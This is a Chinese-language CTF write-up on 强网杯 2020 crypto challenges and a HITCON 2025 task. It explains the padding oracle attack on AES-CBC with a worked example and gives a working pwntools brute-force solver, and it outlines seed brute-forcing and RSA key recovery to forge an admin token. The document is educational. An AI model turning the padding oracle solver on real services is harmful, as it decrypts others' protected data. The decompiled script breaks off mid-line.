<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密</span></span><br><span class="line">1. 会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文</span><br><span class="line">2. 使用加密密钥对密文的第一组进行解密，得到”中间值“  </span><br><span class="line">3. 将中间值和初始化向量进行异或，得到该组的明文</span><br><span class="line">4. 前一块密文是后一块密文的IV，通过异或中间值，得到明文</span><br><span class="line">5. 块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）</span><br><span class="line">6. 校验通过得到明文，校验失败得到密文 </span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Padding Oracle 攻击的条件：</strong><ul>
<li><p>1、攻击者能够获得密文（ciphertext），以及密文对应的IV（初始化向量）</p>
</li>
<li><p>2、攻击者能够触发密文的解密过程，且能够知道密文的解密结果（因为需要根据结果不断尝试）。</p>
</li>
</ul>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/833582b2f560">Padding Oracle Attack(填充提示攻击)详解及验证 - 简书</a></p>
<p>通过上面的例题，详细了解一下padding oracle attack的原理，再针对上面的例题，从已知明文的角度详细了解一下加解密的过程。</p>
<style>.cteuochywxzm{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-6.png" class="cteuochywxzm" alt="img">

<style>.hrsabormxovx{zoom:50%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-7.png" class="hrsabormxovx" alt="img">

<p>例题密文如下，对其进行分组</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7B216A634951170F  # IV</span><br><span class="line">F851D6CC68FC9537  # 第一组密文c1</span><br><span class="line">858795A28ED4AAC6  # 第二组密文c2</span><br></pre></td></tr></table></figure>

<p>那么可以首先通过构造初始向量IV破解第一组密文。</p>
<p>将IV设置为全0，向服务器提交IV+c1，即00000000000000000F851D6CC68FC9537。</p>
<style>.lagxwxvvybeh{zoom:50%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-8.png" class="lagxwxvvybeh" alt="img">

<p>首先假设明文从c1填充了最后一字节，那么按照填充规则，最后一字节明文应当是填充0x01。</p>
<p>那么此时全0 IV一定会解密失败，解密的过程是先解密密文得到一个中间值，然后将中间值和IV异或得到明文，而此时解密出的明文不满足填充规则，也就是不是0x01。</p>
<p>依次将IV最后一个字节从0x01~0xFF递增，直到解密的明文最后一个字节为0x01时，才是正确的padding，而此时IV为0000000000000003C，此时将0000000000000003C+c1提交给服务器，将会返回解密正确的提示，如下图。</p>
<style>.mfhohnxtroci{zoom:50%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-9.png" class="mfhohnxtroci" alt="img">

<p>此时已知IV的最后一个字节为0x3C，最后一个填充字节为0x01，那么即可得到c1解密过程中的中间值的最后一个字节是0x01^0x3C &#x3D; 0x3D。</p>
<p>接着利用同样的方法，假设c1填充了最后两字节，那么填充的内容应当是0x02 0x02。而此时已经知道了中间值的最后一字节是0x3D，那么可以得到IV的最后一字节应该是0x3D^0x02 &#x3D; 0x3F，那么将IV&#x3D;000000000000003F，此时开始从0x00~0xFF遍历IV的倒数第2个字节，直到返回解密成功，如下图</p>
<style>.wmzklkepditu{zoom:50%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-10.png" class="wmzklkepditu" alt="img">

<p>那么此时猜解出了中间值的倒数第二个字节是0x02^0x24 &#x3D; 0x26。以此类推，一直假设至填充8字节0x08，即可完成中间值猜解，如下图。</p>
<style>.glcsqurdsecs{zoom:50%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-11.png" class="glcsqurdsecs" alt="img">

<p>当中间值全部猜解完毕后，将中间值和题目给的IV异或，即可得到c1的明文。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x39</span> <span class="number">0x73</span> <span class="number">0x23</span> <span class="number">0x22</span> <span class="number">0x07</span> <span class="number">0x6A</span> <span class="number">0x26</span> <span class="number">0x3D</span>  <span class="comment"># c1中间值</span></span><br><span class="line"><span class="keyword">xor</span> </span><br><span class="line"><span class="number">0x7B</span> <span class="number">0x21</span> <span class="number">0x6A</span> <span class="number">0x63</span> <span class="number">0x49</span> <span class="number">0x51</span> <span class="number">0x17</span> <span class="number">0x0F</span>  <span class="comment"># 初始IV</span></span><br><span class="line">= </span><br><span class="line">BRIAN;<span class="number">12</span>  <span class="comment"># 明文m1</span></span><br></pre></td></tr></table></figure>

<p><strong>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值得最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。</strong></p>
<p>继续破解第二组密文，第二组密文的IV向量是第一组密文，随意按照上述的逻辑构造第一组密文，即可破解出第二组明文。也就是从00000000000000000858795A28ED4AAC6开始遍历，直至找到中间值，即可求出明文m2。</p>
<p>再回到本题，本题解密并不返回结果，只返回能不能成功解密，iv可控，因此也是要利用padding oracle attack填充提示攻击。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">31313131313131313131313131313131 # IV，即ASCII &#x27;1&#x27;的重复</span><br><span class="line">891f3925b171f363bfc1ab0f4c03c917 # 第一组密文c1</span><br><span class="line">2cdfbd56dbd225d2accaf2b6fcbd0780 # 第二组密文c2</span><br><span class="line">dec(c1) = iv ^ m1</span><br><span class="line">dec(c2) = c1 ^ m2</span><br><span class="line">iv = 1111111111111111</span><br><span class="line">c1、c2已知</span><br><span class="line">m2 = &#x27;\x10&#x27;*16</span><br></pre></td></tr></table></figure>

<p>要求m1，就必须使用唯一与其相关的c1；利用填充规则，就必须将c1置于最后一段。尝试以下的解密输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一段：&#x27;\x00&#x27; * 15 + ?</span><br><span class="line">第二段：c1</span><br></pre></td></tr></table></figure>

<p>对于?取值0~255依次进行测试。根据CBC解密流程，如果当?&#x3D;a时能够解密成功，说明此时解密的第一段明文最后一字节为\x01，即m1的末位为 a ^ iv ^ 0x01，a即为不变的中间值的最后一位。</p>
<p>接着用a ^ 0x01 ^ 0x02来代替a作为固定末位，此时解密的最后一位固定为\x02。继续调整输入第一段的倒数第二位，使得解密结果末尾为\x02\x02，此时解密成功，可求出m1的倒数第二位。以此类推可以求出m1。再把c1作为c2的IV，按照同样的方法求得m2。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chal6</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[-] your choice:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;[+] iv+aes128_cbc(key,iv,padding(secret)):&quot;</span>)</span><br><span class="line">    msg = unhexlify(io.recvline().strip())</span><br><span class="line">    iv, cipher = msg[:<span class="number">16</span>], msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    暴力破解第一段密文</span></span><br><span class="line"><span class="string">    secret = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        for j in tqdm(range(0x100)):</span></span><br><span class="line"><span class="string">            ct = iv[:15-i] + bytes([j]) + iv[16-i:] + cipher</span></span><br><span class="line"><span class="string">            if chal6_dec(ct) == True:</span></span><br><span class="line"><span class="string">                secret = bytes([iv[-i - 1] ^ j ^ (i + 1)]) + secret</span></span><br><span class="line"><span class="string">                iv = iv[:15-i] + xor(ct[15-i:16], bytes([(i + 1) ^ (i + 2)]) * (i + 1))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">        print(secret)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    secret = <span class="string">b&#x27;\xe6?\xee\x07\xa3\x07\xaa\xc8\x8em\xb5\xa0\x90&#x27;</span></span><br><span class="line">    iv = iv[:<span class="number">16</span>-<span class="built_in">len</span>(secret)] + xor(iv[<span class="number">16</span>-<span class="built_in">len</span>(secret):], xor(secret, <span class="built_in">bytes</span>([<span class="built_in">len</span>(secret) + <span class="number">1</span>]) * <span class="built_in">len</span>(secret)))</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret), <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0x100</span>)):</span><br><span class="line">            ct = iv[:<span class="number">15</span>-i] + <span class="built_in">bytes</span>([j]) + iv[<span class="number">16</span>-i:] + cipher</span><br><span class="line">            <span class="keyword">if</span> chal6_dec(ct) == <span class="literal">True</span>:</span><br><span class="line">                secret = <span class="built_in">bytes</span>([iv[-i - <span class="number">1</span>] ^ j ^ (i + <span class="number">1</span>)]) + secret</span><br><span class="line">                iv = iv[:<span class="number">15</span>-i] + xor(ct[<span class="number">15</span>-i:<span class="number">16</span>], <span class="built_in">bytes</span>([(i + <span class="number">1</span>) ^ (i + <span class="number">2</span>)]) * (i + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(secret)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[-] your choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[-] secret(encode hex):&quot;</span>, hexlify(secret))</span><br></pre></td></tr></table></figure>

<h1 id="fault"><a href="#fault" class="headerlink" title="fault"></a>fault</h1><blockquote>
<p>国密SM4</p>
<p><a target="_blank" rel="noopener" href="https://blog.soreatu.com/posts/case-study-differetial-cryptanalysis-attack/#%E5%BC%BA%E7%BD%91%E6%9D%AF2020-fault">Case Study: Differetial Cryptanalysis Attack | Soreat_u’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://su-team.cn/posts/48139.html#modestudy">强网杯 S4 SU Write-Up - su-team</a></p>
</blockquote>
<h1 id="flagsystem"><a href="#flagsystem" class="headerlink" title="flagsystem"></a>flagsystem</h1><p>首先获得原始令牌，注册得到(signature, data)</p>
<p>由于seed是利用time.time()时间戳生成，可±10秒进行爆破，获取正确的seed后，可获取初始的random_constants和random_iv。</p>
<p>爆破sha256的前缀破解pow。</p>
<p>构造恶意数据，在原始数据后添加新的权限字段0xFF，也就是创建权限为0xFF的数据。</p>
<p>li用爆破出的seed计算而已数据的哈希</p>
<p>利用给出的N和e，以及给出的签名消sign也就是密文c，已知N、e、c可以通过一系列方法求p、q、d。</p>
<p>然后直接用d对哈希进行签名，获取权限为0xFF的令牌。</p>
<p><strong>没找到wp，先放放。</strong></p>
<h1 id="hitcon-ctf2025-Sharing-is-caring"><a href="#hitcon-ctf2025-Sharing-is-caring" class="headerlink" title="hitcon ctf2025_Sharing is caring"></a>hitcon ctf2025_Sharing is caring</h1><blockquote>
<p>李博士打hitcon ctf2025时有一道re题，解开后是一道密码题</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> IPython <span class="keyword">import</span> embed</span><br><span class="line"></span><br><span class="line">rrt = [</span><br><span class="line">    <span class="number">0x1F0C22AD1FC79BAD9998E741F118A0E4DC6186734A25A072CB657AC3E9B05DB5F30451DD9E8F4BE8F</span>,</span><br><span class="line">    -<span class="number">0xF8611568FE3CDD6CCCC73A0F88C50726E30C339A512D03965B2BD61F4D82EDAF98228EECF47A5F48</span>,</span><br><span class="line">    <span class="number">0xA81F883356FCE6CC28C3E8BBD7E1D0957F5336FA947DA83937D361F8D443638E38F1C480262E9B49</span>,</span><br><span class="line">    -<span class="number">0x1FFD4D76D7563C2929E079FD815862501DDBCF6F1B71520D3894879E8193D46F719A38A4343BF0BB</span>,</span><br><span class="line">    -<span class="number">0x258A737960D8A6770B5A88E2DBD5CB18747D7CFC0C2AEEB727E31FF15463E85B42BAEE49D9E0CC0F</span>,</span><br><span class="line">    <span class="number">0x42D8D6C7C60482107421060735391BD75AC329010148D32EC2E872178C87E382432F5B00FA07C01C</span>,</span><br><span class="line">    -<span class="number">0x11C3AC8DE06A1450EA78018E230686B2EE978E7A4D98560D51C61DE7A8362CA6DDCC45E1147B8885</span>,</span><br><span class="line">    <span class="number">0x43AA96AA8C3002C6EBB9BE5563667785F6E9DFAB912FAAF741CFBD0A03428F365E0FCE3284B3B8B3</span>,</span><br><span class="line">    <span class="number">0x7AFDE950DD9AE47637ED2C6FB7250DD4DB4B3DDE2284A9B87582E1F73C91440687E33CB2BBFC5189B</span>,</span><br><span class="line">    -<span class="number">0x3CA029BD608E714CA5F1C7B035282C42D00DF1FEB16ABD40D0F976F75EA6D3686227395F604A25676D</span>,</span><br><span class="line">    <span class="number">0x166CB92444160450747991DBBDF057BAF85916E5F0A355CCD7ECC9A0D993582AA923F5B4FB2ABABC81</span>,</span><br><span class="line">    -<span class="number">0x663E489FBDAEC80D1884477F020778B5A2D090399A17B6AE5817A8EF1EA99F655003967D3A609224FD</span>,</span><br><span class="line">    <span class="number">0x1BAB93E013E3D17B5364244083170DFE0BD5A1F99BA1643851400892E0D4AADEDF122B0507F93BC27F</span>,</span><br><span class="line">    -<span class="number">0xCC39640F78F10E9EFD61E2B44CFEE4D9117B4A3A84139BAF9C5EDA67C578021CD48C4B57E6AF0F44F</span>,</span><br><span class="line">    <span class="number">0x21F2983A517C4FAEA38B3812E0331396A03FA4F4405203C1756C0C4167589CFAABDB61429C901B23315</span>,</span><br><span class="line">    -<span class="number">0xD0043580FE877D8ED2B5DA1F3DD452925BD11D7F0A4BEB5F7614785BECE71FAF6CFE03AD64B8234D33</span>,</span><br><span class="line">    <span class="number">0x633DD371A42F8D22B2D0CB201CCB16EBBA8F405FF2B113814CE8DFDD36F81C6AE0B58158186627766A9</span>,</span><br><span class="line">    -<span class="number">0xB819D98EB71AC2A8B05296FA5FC31454AD69C910704A6EB205E2B2026BEFD69851240F5BAD1B20319</span>,</span><br><span class="line">    <span class="number">0x252235BEDC59ECEEDC518812E51AFD4724A090E89A5A10509A9F03C53C3663DCB9755DB5D90EA7311D3</span>,</span><br><span class="line">    -<span class="number">0xE2178F78C86017B224413FEAE2C4F3C32524C72BEA949AF624BA5012A7266BAE3A83036A747E10D5D05</span>,</span><br><span class="line">    <span class="number">0x605197C25F89C947BC425DA91858B982F21C31615F61418E16420CD725CA6038B7A0FF8110546470032F</span>,</span><br><span class="line">    -<span class="number">0x1B45970BD9A24B31CCF3F3DDBAF6E55F85EAB899B8256438136F66C9D6ACA008FC5EFC3A68C643F30049</span>,</span><br><span class="line">    <span class="number">0x25CAB05492FBBE7F64C1D2DAF9601F29992C5BA78F18D0AFDE3BB1267496AFDD4521F24812809F71FFBF</span>,</span><br><span class="line">    -<span class="number">0x8ED7098BC09611E0669A9D014C7E1A3B32B54801C45FE1DA070EAC5D6C2E0D77063A214ABD52D96CE97</span>,</span><br><span class="line">    <span class="number">0x2413FEDDCE36DE145AE57CD141C38176341F00E5CB8CFDB4C8DFDA319C80C8A4AFF337E49F73DF2EF06F</span>,</span><br><span class="line">    -<span class="number">0x2F3203C80A7C3442696575EDB2962C106836B1A5B8120FDAC440F06895C75F5CF034D3F586E0AD6A08479</span>,</span><br><span class="line">    <span class="number">0xF46ECA5D31CD4D7493DBFB47A83FE50B0853451DFDB346086AEDA8C1BECCCF97B60D1E9160091FF8D773</span>,</span><br><span class="line">    -<span class="number">0x3470EBC21C3C8E65D3B15C3D01681A308F65D5E69E52DB1D847C51C96D60FB0BF09CA6A3A1EAB9125D335</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ttr = [</span><br><span class="line">    <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">240</span>, <span class="number">40320</span>, <span class="number">362880</span>, <span class="number">403200</span>, <span class="number">7983360</span>, <span class="number">11975040</span>, <span class="number">37065600</span>,</span><br><span class="line">    <span class="number">0x2E6519800</span>, <span class="number">0xA261D9400</span>, <span class="number">0x32BE93E4000</span>, <span class="number">0x466BBD9000</span>, <span class="number">0xC218F5AE8000</span>,</span><br><span class="line">    <span class="number">0x4807432BC18000</span>, <span class="number">0x21C3677C82B40000</span>, <span class="number">0xB141DF4DAE310000</span>, <span class="number">0xF3BA930ACF8360000</span>,</span><br><span class="line">    <span class="number">0x280A89874301780000</span>, <span class="number">0x5B65F7240DD14400000</span>, <span class="number">0x446E0208A903029400000</span>,</span><br><span class="line">    <span class="number">0xDE65869C2549C86100000</span>, <span class="number">0x211D3C0B03AB74E50800000</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0~29，使用分数运算计算一个大整数，基于rrt和ttr数组的有理数运算</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rrn</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 特殊情况，rrn(17)=1, rrn(18)=0</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> (<span class="number">17</span>, <span class="number">18</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">18</span> - n</span><br><span class="line">    F = Fraction</span><br><span class="line">    n = <span class="built_in">len</span>(rrt) <span class="comment"># 28</span></span><br><span class="line">    acc = F(<span class="number">0</span>, <span class="number">1</span>) <span class="comment"># 累加</span></span><br><span class="line">    mul = F(<span class="number">1</span>, <span class="number">1</span>) <span class="comment"># 累乘</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        acc += F(rrt[i], ttr[i]) * mul</span><br><span class="line">        mul *= F(n - i, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(acc)</span><br><span class="line"></span><br><span class="line">triple = [(rrn(<span class="number">7</span>), rrn(<span class="number">8</span>), rrn(<span class="number">9</span>)), (rrn(<span class="number">10</span>), rrn(<span class="number">11</span>), rrn(<span class="number">12</span>)), (rrn(<span class="number">13</span>), rrn(<span class="number">14</span>), rrn(<span class="number">15</span>))]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0 4144803293417776131310451317495228706499130241044716671850484110288180082374299088166459295448719</span></span><br><span class="line"><span class="string">1 2072401646708888065655225658747614353249565120522358335925242055144090041187149544083229647724359</span></span><br><span class="line"><span class="string">2 1402769202505631727601810730581776197716350949074282314174097681867464170562021714349605843278664</span></span><br><span class="line"><span class="string">3 1335174568503939352563889373190143608146136792487939183543780907770759908268721571509488188235873</span></span><br><span class="line"><span class="string">4 442427645836698445267007097625472942305363362863130591746066528455945891079759637465163543741507</span></span><br><span class="line"><span class="string">5 1132891618999846053017541510085320021631035459029704515373044135313614915469753666299478525789537</span></span><br><span class="line"><span class="string">6 3440625422497330758356285966425842805899353260932540945262402832827054563258418833844309632149096</span></span><br><span class="line"><span class="string">7 51966</span></span><br><span class="line"><span class="string">8 480442839669953990717445646260333383833736214883976558477525831992994289143305421629761482429714</span></span><br><span class="line"><span class="string">9 680701978345522085049694956190292511497787092168524280991013677878931201637910598103187515536181</span></span><br><span class="line"><span class="string">10 47806</span></span><br><span class="line"><span class="string">11 253717457675323180603201716971045682091261518437666533915787790782521696917056900361404824269689</span></span><br><span class="line"><span class="string">12 99768326317759269813131181172947299870925613919195157126671930387206518545837120733862757382354</span></span><br><span class="line"><span class="string">13 201527</span></span><br><span class="line"><span class="string">14 782319055923618868639890136618720319997476308047895888006842867173403800015590219030945524995543</span></span><br><span class="line"><span class="string">15 944213788775446264472010893716848921879528565854393198519311752189219209422386607874556309845161</span></span><br><span class="line"><span class="string">16 865967982817260602973374066425323583617367103807916127263320767485154348516392723060969424214055</span></span><br><span class="line"><span class="string">17 1</span></span><br><span class="line"><span class="string">18 0</span></span><br><span class="line"><span class="string">19 3</span></span><br><span class="line"><span class="string">20 6</span></span><br><span class="line"><span class="string">21 2</span></span><br><span class="line"><span class="string">22 4919</span></span><br><span class="line"><span class="string">23 132146363252892079238955852043754382244951307426448497798760465957265430114543661757753602857394</span></span><br><span class="line"><span class="string">24 57005</span></span><br><span class="line"><span class="string">25 775309903033854570882823603825659470664893675806480830434450057789819902048494192286724670375083</span></span><br><span class="line"><span class="string">26 48879</span></span><br><span class="line"><span class="string">27 118549588096765345719828273586922254620646262475213503758232906237813765902929584873401252181598</span></span><br><span class="line"><span class="string">28 -17927833311757106272913600706201967593825828617408413393921146586262101308545356473435323364772083605196</span></span><br><span class="line"><span class="string">29 -480626274858555850271738168267749839659770589949752910052809542789249901244053865124196593810519595669432</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 位加法运算，计算两个大数相加</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        carry = a &amp; a</span><br><span class="line">        a = a ^ b</span><br><span class="line">        b = carry &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="comment"># 位运算乘法，计算两个数相乘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span> * mul(a, -b)</span><br><span class="line">    acc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        acc += a <span class="keyword">if</span> (b &amp; <span class="number">1</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        a &lt;&lt;= <span class="number">1</span></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> acc</span><br><span class="line"><span class="comment"># 模幂运算，例如计算modexp(3, 13, 7)，也就是计算3^13 mod 7的结果res=3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modexp</span>(<span class="params">base, exp, mod</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line">    b = base % mod</span><br><span class="line">    e = exp</span><br><span class="line">    <span class="keyword">while</span> e:</span><br><span class="line">        <span class="keyword">if</span> e &amp; <span class="number">1</span>:</span><br><span class="line">            res = mul(res, b) % mod</span><br><span class="line">        b = mul(b, b) % mod</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">k, v1, v2</span>):</span><br><span class="line">    <span class="comment"># 获取模数</span></span><br><span class="line">    M = rrn(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 计算左边(rrn(2)^v1 * rrn(3)^v2) mod M</span></span><br><span class="line">    left = mul(modexp(rrn(<span class="number">2</span>), v1, M), modexp(rrn(<span class="number">3</span>), v2, M)) % M</span><br><span class="line">    acc, step = <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">    <span class="comment"># 计算右边，累乘rrn(4)^1 * rrn(5)^k * rrn(6)^(k^2)</span></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> [rrn(<span class="number">4</span>), rrn(<span class="number">5</span>), rrn(<span class="number">6</span>)]:</span><br><span class="line">        acc = mul(acc, 